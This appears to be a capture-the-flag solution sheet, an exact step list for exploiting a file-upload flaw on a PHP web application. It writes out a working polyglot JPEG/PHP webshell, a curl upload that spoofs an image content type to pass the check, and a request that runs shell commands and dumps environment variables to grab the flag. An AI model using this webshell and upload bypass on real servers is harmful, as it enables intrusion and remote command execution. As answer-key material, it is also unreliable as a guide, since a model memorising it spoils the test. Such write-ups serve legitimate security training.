# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Arbitrary file upload → RCE via a polyglot JPEG/PHP webshell. The
upload accepts a file whose content starts with the JPEG magic bytes (passing the
image check) but also contains PHP, and it is saved with a `.php` name under a
PHP-executing directory. The flag is in the environment.

1. **Create a JPEG-magic + PHP polyglot shell:**

   ```
   printf '\xff\xd8<?php system($_GET["cmd"]); ?>' > shell.jpg.php
   ```

2. **Upload it** (declare a JPEG content-type to pass the image check):

   ```
   curl -s -F "userfile=@shell.jpg.php;filename=shell.jpg.php;type=image/jpeg" \
     -F "submit=submit" http://<target>/index.php
   ```

   The response confirms the saved path (e.g. `upload/shell.jpg.php`).

3. **Trigger the shell** and dump the environment (where the flag lives):

   ```
   curl -s "http://<target>/upload/shell.jpg.php?cmd=id;env"
   ```

4. **Extract the flag** (`FLAG{...}`) from the `FLAG=` line in the output and
   report it verbatim.
